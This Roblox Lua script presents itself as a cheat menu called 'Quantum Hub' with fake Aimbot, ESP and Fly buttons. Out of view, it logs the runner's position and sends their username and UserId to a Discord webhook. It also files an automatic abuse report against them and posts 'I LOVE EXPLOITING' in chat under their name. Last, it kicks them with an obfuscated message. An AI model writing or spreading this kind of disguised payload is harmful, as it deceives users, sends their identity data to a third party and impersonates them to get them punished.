local player = game:GetService("Players").LocalPlayer
local httpService = game:GetService("HttpService")
local webhookURL = "YOUR_WEBHOOK_URL" -- Replace with your actual webhook URL

-- Create the Fake GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 250)
Frame.Position = UDim2.new(0.5, -150, 0.5, -125)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Text = "Quantum Hub v2.1.4"
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Parent = Frame

-- Fake Buttons
local function createButton(name, position)
    local Button = Instance.new("TextButton")
    Button.Text = name
    Button.Size = UDim2.new(0.9, 0, 0, 30)
    Button.Position = UDim2.new(0.05, 0, position, 0)
    Button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.Parent = Frame
    return Button
end

local AimbotButton = createButton("Enable Aimbot", 0.2)
local ESPButton = createButton("Enable ESP", 0.4)
local FlyButton = createButton("Enable Fly", 0.6)

-- Fake Loading Effects
local function fakeLoadingEffect(button)
    button.Text = "Loading..."
    task.wait(2)
    button.Text = "Activated!"
    task.wait(1)
    button.Text = "Enable " .. button.Text:gsub(" Activated!", "")
end

AimbotButton.MouseButton1Click:Connect(function() fakeLoadingEffect(AimbotButton) end)
ESPButton.MouseButton1Click:Connect(function() fakeLoadingEffect(ESPButton) end)
FlyButton.MouseButton1Click:Connect(function() fakeLoadingEffect(FlyButton) end)

-- Capture player replay
local replayData = {}
local function captureReplay()
    for i = 1, 10 do
        table.insert(replayData, "Player Position: " .. tostring(player.Character and player.Character:GetPrimaryPartCFrame()))
        task.wait(1)
    end
end

-- Send replay to Discord webhook
local function sendReplay()
    local data = {
        username = "Quantum Hub Logger",
        content = "**Caught a hacker!** 🚨\n**User:** " .. player.Name .. "\n**UserId:** " .. player.UserId .. "\n**Replay Data:** ```\n" .. table.concat(replayData, "\n") .. "\n```"
    }

    local success, err = pcall(function()
        httpService:PostAsync(webhookURL, httpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)

    if not success then
        warn("Failed to send webhook: " .. tostring(err))
    end
end

-- Auto-report the exploiter
game:GetService("Players"):ReportAbuse(player, "Exploiting", "Caught using unauthorized third-party software.")

-- Make them say suspicious things
task.spawn(function()
    for i = 1, 5 do
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
            "I LOVE EXPLOITING! I HOPE I DON'T GET BANNED!", "All"
        )
        task.wait(2)
    end
end)

-- Start capturing replay before kicking
captureReplay()

-- Troll message after 10 seconds
task.wait(10)
sendReplay()
player:Kick(string.char(68, 111, 110, 39, 116, 32, 104, 97, 99, 107, 44, 32, 98, 114, 111, 116, 104, 101, 114, 46, 32, 73, 32, 107, 110, 111, 119, 32, 121, 111, 117, 39, 114, 101, 32, 98, 101, 116, 116, 101, 114, 32, 116, 104, 97, 110, 32, 116, 104, 105, 115, 46))
